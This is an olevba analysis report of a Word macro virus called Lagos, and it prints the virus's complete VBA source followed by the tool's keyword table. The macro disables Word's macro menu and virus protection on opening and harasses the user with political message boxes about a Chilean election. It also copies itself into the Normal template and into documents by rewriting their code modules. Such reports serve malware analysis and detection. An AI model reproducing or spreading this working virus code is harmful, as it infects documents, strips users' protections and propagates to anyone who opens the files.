olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Lagos-86c9b60d3ee11d91c325439bf96df34ef29c1bf0
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Lagos.cls 
in file: Virus.MSWord.Lagos-86c9b60d3ee11d91c325439bf96df34ef29c1bf0 - OLE stream: 'Macros/VBA/Lagos'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
' Proteccion
CommandBars("Tools").Controls("Macro").Enabled = False
Options.VirusProtection = False
' Danno
'If ActiveDocument.VBProject.VBComponents.Item(1).Name <> "Lagos" Then
'    Selection.TypeParagraph
'    For a = 1 To 10
'        Selection.TypeText ("No a Lagos, va a pudrir al país!!!")
'        Selection.TypeParagraph
'    Next a
'endif
Dim boton
boton = vbYesNo + vbCritical + vbDefaultButton2
respuesta = MsgBox("Ud. Vota por Lagos?", boton, "Decida:")
If respuesta = vbYes Then
    MsgBox ("Ud no apoya al pais")
    respuesta3 = vbYes
    While respuesta3 = vbYes
    respuesta2 = MsgBox("Esta seguro de votar por Lagos?", boton, "Pienselo Bien")
    If respuesta2 = vbNo Then
        MsgBox ("Acuerdece de pensarlo bien en la eleccion")
        respuesta3 = vbNo
    Else
        MsgBox ("Dese  cuenta de lo que esta haciendo!!")
    End If
    Wend
Else
    MsgBox ("Ud quiere el desarrollo de Chile")
    
End If
' Copia
Set docum = ActiveDocument.VBProject.VBComponents.Item(1)
Set norma = NormalTemplate.VBProject.VBComponents.Item(1)
nldoc = docum.codemodule.countoflines
nlnorm = norma.codemodule.countoflines
bg = 2
If docum.Name <> "Lagos" Then
    If nldoc > 0 Then
        docum.codemodule.deletelines 1, nldoc
    End If
    Set ainfectar = docum
    adocum = True
    docum.Name = "Lagos"
End If
If norma.Name <> "Lagos" Then
    If nlnorm > 0 Then
        norma.codemodule.deletelines 1, nlnorm
    End If
    Set ainfectar = norma
    anorma = True
    norma.Name = "Lagos"
End If
If anorma <> True And adocum <> True Then GoTo aa
If anorma = True Then
    ainfectar.codemodule.addfromstring ("Private Sub Document_Close()")
    Do While docum.codemodule.lines(bg, 1) <> ""
        ainfectar.codemodule.insertlines bg, docum.codemodule.lines(bg, 1)
        bg = bg + 1
    Loop
End If
If adocum = True Then
    ainfectar.codemodule.addfromstring ("Private Sub Document_Open()")
    Do While norma.codemodule.lines(bg, 1) <> ""
        ainfectar.codemodule.insertlines bg, norma.codemodule.lines(bg, 1)
        bg = bg + 1
    Loop
End If
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ActiveDocument.Saved = True
aa:
' Virus Lagos: Es lo menos que se merece.
' Basado en el virus Melisa
' Autor Joe Fasto
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

